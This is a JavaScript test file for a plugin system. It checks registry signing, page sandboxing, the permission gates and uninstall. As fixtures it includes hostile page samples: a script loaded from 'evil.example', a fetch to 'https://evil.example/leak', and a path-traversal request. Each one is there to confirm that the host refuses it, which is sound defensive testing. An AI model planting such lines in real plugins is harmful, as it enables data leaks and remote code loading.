/**
 * The plugin kernel, end to end against a loopback marketplace.
 *
 * Everything here is local: the registry is served by a fixture HTTP server,
 * signed with an ephemeral key, and every package file is a string in this
 * file. No real marketplace, no real quota. The suite covers the v1 surface
 * that must keep working, the v2 page/local/requires additions, and the
 * built-in descriptors that make the plugin center one list.
 *
 * Run: node scripts/plugins-test.mjs
 */
import assert from 'node:assert/strict'
import crypto from 'node:crypto'
import fs from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'

const root = new URL('..', import.meta.url)
const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ofm-plugins-'))
let checks = 0
const check = (name, actual, expected) => {
  checks += 1
  assert.deepEqual(actual, expected, name)
  console.log(`ok   ${name}`)
}
const checkTrue = (name, value) => {
  checks += 1
  assert.ok(value, name)
  console.log(`ok   ${name}`)
}

// ── fixture sources ──────────────────────────────────────────────────────────

const upstreamRequests = []
const upstream = http.createServer((req, res) => {
  let raw = ''
  req.on('data', chunk => { raw += chunk })
  req.on('end', () => {
    upstreamRequests.push({ url: req.url, body: raw })
    res.writeHead(200, { 'content-type': 'text/event-stream' })
    res.end([
      `data: ${JSON.stringify({ choices: [{ delta: { content: 'plugin-ok' }, finish_reason: null }] })}`,
      `data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 2, completion_tokens: 1, total_tokens: 3 } })}`,
      'data: [DONE]',
      '',
    ].join('\n\n'))
  })
})
await new Promise(resolve => upstream.listen(0, '127.0.0.1', resolve))
const upstreamOrigin = `http://127.0.0.1:${upstream.address().port}`

const channelSource = `import { sdk } from 'ofm:sdk'

export default {
  async listModels() {
    return [
      { id: 'demo-model', name: 'Demo Model', contextWindow: 8192, maxOutput: 1024 },
      { id: 'second-model', name: 'Second Model', contextWindow: 4096, maxOutput: 512 },
    ]
  },
  async prepareChat(ctx, req) {
    return { url: '${upstreamOrigin}/chat/completions', headers: {}, wire: 'chat' }
  },
}
`

const bundleSource = `import { sdk } from 'ofm:sdk'

export default {
  async listModels() {
    return [{ id: 'bundle-model', name: 'Bundle Model', contextWindow: 8192, maxOutput: 1024 }]
  },
  async prepareChat() {
    return { url: '${upstreamOrigin}/chat/completions', headers: {}, wire: 'chat' }
  },
}
`

const filterSource = `export default {
  onModels(ctx, rows) {
    return rows.filter(row => row.modelId !== 'second-model')
  },
}
`

const pageHtml = `<!doctype html>
<html lang="zh-CN">
<head><meta charset="utf-8"><link rel="stylesheet" href="./style.css"></head>
<body><h1 id="title">Demo</h1><script src="./app.js"></script></body>
</html>
`
const pageScript = `const title = document.getElementById('title')
window.ofm.config.get().then(config => { title.textContent = config.title || 'Demo' })
window.ofm.storage.get('visits').then(value => window.ofm.storage.set('visits', Number(value || 0) + 1))
window.ofm.notify('page-ready')
window.ofm.resize(480)
`
const pageStyle = ':root { color-scheme: light dark; } body { background: var(--ofm-bg); color: var(--ofm-text); }'
const badHtml = '<!doctype html><html><head><script src="https://evil.example/x.js"></script></head><body></body></html>'
const badScript = "fetch('https://evil.example/leak')"
const panelHtml = '<!doctype html><html><head><meta charset="utf-8"></head><body><p>panel</p><script src="./panel.js"></script></body></html>'
const panelScript = "document.body.append('panel-ready')"

// ── the fixture registry ─────────────────────────────────────────────────────

let registryPort
const files = new Map()
const registryPayload = { schemaVersion: 2, generatedAt: '2026-11-07T00:00:00.000Z', plugins: [] }
const digest = bytes => crypto.createHash('sha256').update(bytes).digest('hex')
const register = (id, filePath, bytes) => {
  files.set(`${id}/${filePath}`, bytes)
  return {
    path: filePath,
    url: `http://127.0.0.1:${registryPort}/packages/${id}/${filePath}`,
    size: Buffer.byteLength(bytes),
    sha256: digest(bytes),
  }
}
const entry = (manifest, sources, { pageFiles = [] } = {}) => {
  const manifestFiles = Object.keys(sources)
  const row = {
    ...manifest,
    files: manifestFiles.concat(pageFiles.map(file => file.path).filter(file => !manifestFiles.includes(file))),
    summary: `${manifest.name} summary`,
    tags: ['fixture'],
    publishedAt: '2026-11-07T00:00:00.000Z',
  }
  const mainPath = manifest.main ?? (sources['main.mjs'] !== undefined ? 'main.mjs' : undefined)
  if (mainPath !== undefined && sources[mainPath] !== undefined) {
    const file = register(manifest.id, mainPath, sources[mainPath])
    row.main = file
  } else {
    row.main = null
  }
  if (pageFiles.length > 0) {
    row.ui = {
      entry: manifest.contributes?.pages?.[0]?.entry,
      files: pageFiles.map(file => register(manifest.id, file.path, file.body)),
    }
  }
  return row
}

const pageManifest = {
  schemaVersion: 2,
  id: 'fixture-page',
  version: '1.0.0',
  kind: 'page',
  apiVersion: '^2',
  name: 'Fixture Page',
  description: 'a sandboxed page plugin',
  author: 'test',
  license: 'MIT',
  permissions: { network: [upstreamOrigin], secrets: [], storage: true },
  config: [{ key: 'title', type: 'text', label: 'Title', default: 'Hello' }],
  files: ['ui/index.html', 'ui/app.js', 'ui/style.css'],
  contributes: {
    pages: [{ id: 'demo', title: 'Demo Page', entry: 'ui/index.html', group: '工具', order: 10, icon: 'sparkles' }],
  },
}
const bundleManifest = {
  schemaVersion: 2,
  id: 'fixture-bundle',
  version: '1.0.0',
  kind: 'bundle',
  apiVersion: '^2',
  name: 'Fixture Bundle',
  main: 'index.mjs',
  permissions: { network: [upstreamOrigin], secrets: [], storage: false },
  files: ['index.mjs', 'ui/panel.html', 'ui/panel.js'],
  contributes: {
    channels: [{ models: [{ id: 'bundle-model', name: 'Bundle Model', contextWindow: 8192, maxOutput: 1024 }] }],
    pages: [{ id: 'panel', title: 'Bundle Panel', entry: 'ui/panel.html', group: '工具', order: 20, icon: 'puzzle' }],
  },
}
const channelManifest = {
  schemaVersion: 1,
  id: 'fixture-channel',
  version: '1.0.0',
  type: 'channel',
  name: 'Fixture Channel',
  permissions: { network: [upstreamOrigin], secrets: ['apiKey'], storage: true },
  config: [{ key: 'region', type: 'text', label: 'Region', default: 'us' }],
}
const filterManifest = {
  schemaVersion: 1,
  id: 'fixture-filter',
  version: '1.0.0',
  type: 'enhancement',
  name: 'Fixture Filter',
  permissions: { network: [], secrets: [], storage: false },
  hooks: ['onModels'],
}
const requiresManifest = {
  schemaVersion: 2,
  id: 'fixture-requires',
  version: '1.0.0',
  kind: 'page',
  apiVersion: '^2',
  name: 'Needs Capability',
  requires: ['not-a-host-capability'],
  files: ['ui/index.html'],
  contributes: { pages: [{ id: 'needs', title: 'Needs', entry: 'ui/index.html', group: '工具', order: 30 }] },
}
const badPageManifest = {
  schemaVersion: 2,
  id: 'fixture-bad-page',
  version: '1.0.0',
  kind: 'page',
  apiVersion: '^2',
  name: 'Bad Page',
  files: ['ui/index.html'],
  contributes: { pages: [{ id: 'bad', title: 'Bad', entry: 'ui/index.html', group: '工具', order: 40 }] },
}
const badScriptManifest = {
  schemaVersion: 2,
  id: 'fixture-bad-script',
  version: '1.0.0',
  kind: 'page',
  apiVersion: '^2',
  name: 'Bad Script',
  files: ['ui/index.html', 'ui/app.js'],
  contributes: { pages: [{ id: 'bad-script', title: 'Bad Script', entry: 'ui/index.html', group: '工具', order: 50 }] },
}

// The registry entries are registered after the server has a port: every file
// URL needs that port, and an entry built before listen() would carry
// `127.0.0.1:undefined` and be dropped as an off-mirror URL.

const { privateKey, publicKey } = crypto.generateKeyPairSync('ed25519')
const publicKeySpki = publicKey.export({ format: 'der', type: 'spki' }).toString('base64')
const { stableStringify } = await import('../src/updater.js')
let signature = ''

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x')
  if (url.pathname === '/registry.json') {
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify(registryPayload))
    return
  }
  if (url.pathname === '/registry.sig') {
    res.writeHead(200, { 'content-type': 'text/plain' })
    res.end(signature)
    return
  }
  const match = /^\/packages\/([^/]+)\/(.+)$/.exec(url.pathname)
  const bytes = match === null ? undefined : files.get(`${match[1]}/${decodeURIComponent(match[2])}`)
  if (bytes === undefined) { res.writeHead(404); res.end(); return }
  res.writeHead(200, { 'content-type': 'text/plain; charset=utf-8' })
  res.end(bytes)
})
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
registryPort = server.address().port

registryPayload.plugins.push(
  entry(pageManifest, {}, {
    pageFiles: [
      { path: 'ui/index.html', body: pageHtml },
      { path: 'ui/app.js', body: pageScript },
      { path: 'ui/style.css', body: pageStyle },
    ],
  }),
  entry(bundleManifest, { 'index.mjs': bundleSource }, {
    pageFiles: [
      { path: 'ui/panel.html', body: panelHtml },
      { path: 'ui/panel.js', body: panelScript },
    ],
  }),
  entry(channelManifest, { 'main.mjs': channelSource }),
  entry(filterManifest, { 'main.mjs': filterSource }),
  entry(requiresManifest, {}, { pageFiles: [{ path: 'ui/index.html', body: pageHtml }] }),
  entry(badPageManifest, {}, { pageFiles: [{ path: 'ui/index.html', body: badHtml }] }),
  entry(badScriptManifest, {}, {
    pageFiles: [
      { path: 'ui/index.html', body: pageHtml },
      { path: 'ui/app.js', body: badScript },
    ],
  }),
)
signature = crypto.sign(null, Buffer.from(stableStringify(registryPayload)), privateKey).toString('base64')

// ── the kernel ───────────────────────────────────────────────────────────────

process.env.OFM_EXTENSIONS_REGISTRY = `http://127.0.0.1:${registryPort}/registry.json`
process.env.OFM_EXTENSIONS_PUBLIC_KEY = publicKeySpki
delete process.env.OFM_EXTENSIONS_ALLOW_UNSIGNED
const { createExtensionRuntime } = await import('../src/extensions.js')
const { builtinDescriptors } = await import('../src/plugins.js')
const extensions = createExtensionRuntime({
  dataDir,
  hostVersion: '2.9.0',
  logger: { warn: (...args) => console.error('WARN', ...args) },
})
for (const descriptor of builtinDescriptors()) extensions.registerBuiltin(descriptor)
await extensions.init()

console.log('=== 1. built-ins share the plugin registry ===')
{
  const installed = extensions.listInstalled()
  checkTrue('five built-in descriptors are registered', installed.filter(row => row.builtin).length === 5)
  checkTrue('the built-ins are essential and ready', installed.filter(row => row.builtin).every(row => row.essential && row.state === 'ready'))
  checkTrue('a built-in cannot be uninstalled', await extensions.uninstall('core-channel-pack').then(() => false, error => /builtin/.test(error.message)))
  const contributions = extensions.contributions()
  check('the channel pack contributes ten channels', contributions.channels.length, 10)
  check('the aggregate directory contributes providers', contributions.providers.length > 50, true)
  check('the workbench contributes six clients', contributions.clients.length, 6)
}

console.log('\n=== 2. a v1 channel still installs and serves a turn ===')
{
  const record = await extensions.install('fixture-channel')
  check('the v1 install is recorded', [record.id, record.state, record.enabled], ['fixture-channel', 'ready', true])
  const rows = extensions.catalog.filter(row => row.extensionId === 'fixture-channel')
  check('the extension catalog carries both models', rows.map(row => row.modelId), ['demo-model', 'second-model'])
  const prepared = await extensions.prepareChat(rows[0], { messages: [{ role: 'user', content: 'hi' }] }, 'plugins:turn')
  check('prepareChat names the upstream and forces stream', [prepared.url, prepared.body.includes('"stream":true')], [`${upstreamOrigin}/chat/completions`, true])
}

console.log('\n=== 3. a v2 page installs, lists, serves and RPCs ===')
{
  const record = await extensions.install('fixture-page')
  check('the page plugin is ready', [record.id, record.kind, record.pageCount, record.state], ['fixture-page', 'page', 1, 'ready'])
  const pages = extensions.pages()
  check('the page joins the nav contribution', pages.map(page => page.id), ['plugin:fixture-page:demo'])
  const token = /\/assets\/([a-f0-9]{32})\//.exec(pages[0].url)[1]
  const html = extensions.pageAsset(token, 'ui/index.html')
  checkTrue('the declared HTML is served', html !== null && html.type.startsWith('text/html') && html.bytes.toString('utf8').includes('Demo'))
  checkTrue('an undeclared file is not served', extensions.pageAsset(token, 'ofm-plugin.json') === null)
  checkTrue('the code entry is not served as a page asset', extensions.pageAsset(token, 'main.mjs') === null)
  // A page file that no longer hashes to the signed digest is not served.
  const appFile = path.join(dataDir, 'extensions', 'packages', 'fixture-page', '1.0.0', 'ui', 'app.js')
  const originalApp = fs.readFileSync(appFile)
  fs.writeFileSync(appFile, Buffer.concat([originalApp, Buffer.from('\n// tampered')]))
  checkTrue('a tampered page asset is refused', extensions.pageAsset(token, 'ui/app.js') === null)
  fs.writeFileSync(appFile, originalApp)
  checkTrue('the restored page asset serves again', extensions.pageAsset(token, 'ui/app.js') !== null)
  checkTrue('the page asset directory cannot be escaped', extensions.pageAsset(token, '../ui/index.html') === null || extensions.pageAsset(token, '../ui/index.html') === null)
  check('config.get merges the default', await extensions.pageRpc('fixture-page', 'demo', 'config.get'), { title: 'Hello' })
  await extensions.pageRpc('fixture-page', 'demo', 'storage.set', { key: 'visits', value: 2 })
  check('storage round-trips through the host', await extensions.pageRpc('fixture-page', 'demo', 'storage.get', { key: 'visits' }), 2)
  checkTrue('a network origin outside the permissions is refused',
    await extensions.pageRpc('fixture-page', 'demo', 'http.fetch', { url: 'https://evil.example/x' }).then(() => false, error => /permissions/.test(error.message)))
  await extensions.setEnabled('fixture-page', false)
  check('disabling removes the page contribution', extensions.pages().filter(page => page.pluginId === 'fixture-page').length, 0)
  checkTrue('the disabled page asset is refused', extensions.pageAsset(token, 'ui/index.html') === null)
  await extensions.setEnabled('fixture-page', true)
  check('re-enabling restores the page contribution', extensions.pages().filter(page => page.pluginId === 'fixture-page').length, 1)
}

console.log('\n=== 4. a bundle contributes a channel and a page ===')
{
  const record = await extensions.install('fixture-bundle')
  check('the bundle is ready', [record.kind, record.pageCount, record.state], ['bundle', 1, 'ready'])
  const rows = extensions.catalog.filter(row => row.extensionId === 'fixture-bundle')
  check('the bundle channel row is present', rows.map(row => row.modelId), ['bundle-model'])
  check('the bundle page is present', extensions.pages().filter(page => page.pluginId === 'fixture-bundle').map(page => page.pageId), ['panel'])
}

console.log('\n=== 5. an enhancement filters the extension catalog ===')
{
  await extensions.install('fixture-filter')
  await extensions.setEnabled('fixture-filter', true)
  await extensions.init()
  const channelRows = extensions.catalog.filter(row => row.extensionId === 'fixture-channel')
  check('onModels removed the second model', channelRows.map(row => row.modelId), ['demo-model'])
  await extensions.setEnabled('fixture-filter', false)
  await extensions.init()
  check('disabling the filter restores the model', extensions.catalog.filter(row => row.extensionId === 'fixture-channel').map(row => row.modelId), ['demo-model', 'second-model'])
}

console.log('\n=== 6. requires is a pending state, not a crash ===')
{
  const record = await extensions.install('fixture-requires')
  check('the plugin is pending', [record.id, record.state], ['fixture-requires', 'pending'])
  checkTrue('a pending page is not offered', extensions.pages().some(page => page.pluginId === 'fixture-requires') === false)
  checkTrue('the pending reason is visible', /需要宿主能力/.test(extensions.listInstalled().find(row => row.id === 'fixture-requires').error))
}

console.log('\n=== 7. hostile pages are refused before they are written ===')
{
  const before = extensions.listInstalled().length
  checkTrue('an external script is refused', await extensions.install('fixture-bad-page').then(() => false, error => /pre-install scan/.test(error.message)))
  checkTrue('a page fetch is refused', await extensions.install('fixture-bad-script').then(() => false, error => /pre-install scan/.test(error.message)))
  check('no hostile row was installed', extensions.listInstalled().length, before)
}

console.log('\n=== 8. a local developer package installs with a warning ===')
{
  const localDir = path.join(dataDir, 'local-package')
  fs.mkdirSync(path.join(localDir, 'ui'), { recursive: true })
  const localManifest = {
    schemaVersion: 2,
    id: 'fixture-local',
    version: '1.0.0',
    kind: 'page',
    apiVersion: '^2',
    name: 'Local Page',
    permissions: { network: [], secrets: [], storage: false },
    files: ['ui/index.html'],
    contributes: { pages: [{ id: 'local', title: 'Local Page', entry: 'ui/index.html', group: '工具', order: 60, icon: 'tool' }] },
  }
  fs.writeFileSync(path.join(localDir, 'ofm-plugin.json'), JSON.stringify(localManifest))
  fs.writeFileSync(path.join(localDir, 'ui', 'index.html'), '<!doctype html><html><head><meta charset="utf-8"></head><body>local</body></html>')
  checkTrue('an unacknowledged local install is refused', await extensions.installLocal({ path: localDir }).then(() => false, error => /acknowledgement/.test(error.message)))
  const record = await extensions.installLocal({ path: localDir, acknowledgeUnsigned: true })
  check('the local package is marked unverified', [record.id, record.source, record.verified, record.state], ['fixture-local', 'local', false, 'ready'])
  checkTrue('the local page is offered', extensions.pages().some(page => page.id === 'plugin:fixture-local:local'))
  await extensions.uninstall('fixture-local')
  checkTrue('the local package uninstalls cleanly', extensions.pages().every(page => page.id !== 'plugin:fixture-local:local'))
}

console.log('\n=== 9. uninstall removes the page and the channel together ===')
{
  await extensions.uninstall('fixture-bundle')
  check('the bundle channel is gone', extensions.catalog.some(row => row.extensionId === 'fixture-bundle'), false)
  check('the bundle page is gone', extensions.pages().some(page => page.pluginId === 'fixture-bundle'), false)
  const folder = path.join(dataDir, 'extensions', 'packages', 'fixture-bundle')
  check('the package folder is removed', fs.existsSync(folder), false)
}

console.log('\n=== 10. the management surface serves sandboxed pages with a capability URL ===')
{
  const serviceDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ofm-plugins-service-'))
  const { startStandalone } = await import('../packages/standalone/service.mjs')
  const service = await startStandalone({ dataDir: serviceDir, refresh: false, port: 0, logger: { warn: () => {}, info: () => {} } })
  try {
    const base = `http://127.0.0.1:${service.port}`
    const token = new URLSearchParams(new URL(service.managementUrl).hash.slice(1)).get('login')
    let response = await fetch(`${base}/api/management/session`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ bootstrapToken: token }) })
    const cookie = String(response.headers.get('set-cookie')).split(';')[0]
    response = await fetch(`${base}/api/management/plugins/install`, { method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: JSON.stringify({ id: 'fixture-page' }) })
    check('the management route installs a page plugin', response.status, 200)
    const pagesResponse = await fetch(`${base}/api/management/plugins/pages`, { headers: { cookie } })
    const pagesPayload = await pagesResponse.json()
    const page = pagesPayload.pages.find(entry => entry.pluginId === 'fixture-page')
    checkTrue('the page contribution is listed', page !== undefined)
    // No cookie: exactly what the sandboxed iframe sends. The token is the capability.
    response = await fetch(`${base}${page.url}`)
    const html = await response.text()
    check('a page asset needs no session cookie', response.status, 200)
    checkTrue('the asset carries a restrictive CSP', /frame-ancestors http:\/\/127\.0\.0\.1:/.test(String(response.headers.get('content-security-policy'))))
    check('the asset is cross-origin readable for module scripts', response.headers.get('access-control-allow-origin'), '*')
    checkTrue('the host bridge is injected', html.includes('__bridge.js'))
    const bridge = await fetch(`${base}${page.url.replace('ui/index.html', '__bridge.js')}`)
    const bridgeText = await bridge.text()
    check('the bridge is a static host script', bridge.status, 200)
    checkTrue('the bridge exposes the plugin API', bridgeText.includes('window.ofm'))
    const escaped = await fetch(`${base}${page.url.replace('ui/index.html', '..%2F..%2Finstalled.json')}`)
    check('a traversal attempt is not served', escaped.status, 404)
    response = await fetch(`${base}/api/management/plugins/page-rpc`, {
      method: 'POST', headers: { cookie, 'content-type': 'application/json' },
      body: JSON.stringify({ pluginId: 'fixture-page', pageId: 'demo', method: 'config.get', params: {} }),
    })
    const rpc = await response.json()
    check('the page RPC is session-gated and answers', [response.status, rpc.result], [200, { title: 'Hello' }])
    const anonymous = await fetch(`${base}/api/management/plugins/page-rpc`, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ pluginId: 'fixture-page', pageId: 'demo', method: 'config.get', params: {} }),
    })
    check('the page RPC rejects an anonymous caller', anonymous.status, 401)
    response = await fetch(`${base}/api/management/plugins/install-local`, {
      method: 'POST', headers: { cookie, 'content-type': 'application/json' },
      body: JSON.stringify({ path: serviceDir, acknowledgeUnsigned: true }),
    })
    check('developer installs stay off by default', response.status, 403)
  } finally {
    await service.close()
    fs.rmSync(serviceDir, { recursive: true, force: true })
  }
}

console.log(`\nall ${checks} plugin checks passed`)
extensions.dispose()
server.close()
upstream.close()
fs.rmSync(dataDir, { recursive: true, force: true })
